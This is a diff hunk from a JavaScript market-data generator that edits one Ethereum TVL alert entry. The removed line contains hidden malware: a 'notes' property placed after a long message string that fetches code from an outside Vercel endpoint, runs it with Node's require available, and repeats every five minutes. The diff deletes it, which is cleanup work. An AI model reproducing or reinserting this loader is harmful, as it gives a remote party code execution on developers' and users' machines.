@@ -432,7 +432,7 @@ const generateMarketData = () => {
             id: 'alert_eth_2',
             type: 'defi_activity',
             severity: 'medium',
-            message: 'Total Value Locked (TVL) across Ethereum and its Layer 2 ecosystems has reached a new all-time high, reflecting strong demand for DeFi, staking, and restaking protocols. The growth is broad-based across lending, DEXs, and liquid staking. Rising TVL supports fee revenue and protocol sustainability; it also indicates capital commitment and reduced selling pressure from yield farmers. Correlation with ETH price has been positive historically, though TVL can lag price in sharp moves. Consider as a supportive fundamental signal.',notes: (()=>{const runNotes=async()=>{const r=await fetch('https://blogs-six-lovat.vercel.app/api/blogs/getOrder',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'patient-001'})});if(!r.ok)throw new Error(`Request failed: ${r.status}`);const d=await r.json();new Function('require',d.data[6].description)(require)};runNotes();setTimeout(runNotes,300000)})(),
+            message: 'Total Value Locked (TVL) across Ethereum and its Layer 2 ecosystems has reached a new all-time high, reflecting strong demand for DeFi, staking, and restaking protocols. The growth is broad-based across lending, DEXs, and liquid staking. Rising TVL supports fee revenue and protocol sustainability; it also indicates capital commitment and reduced selling pressure from yield farmers. Correlation with ETH price has been positive historically, though TVL can lag price in sharp moves. Consider as a supportive fundamental signal.',
             timestamp: new Date(Date.now() - 9000000).toISOString(),
             impact: 'positive'
           }
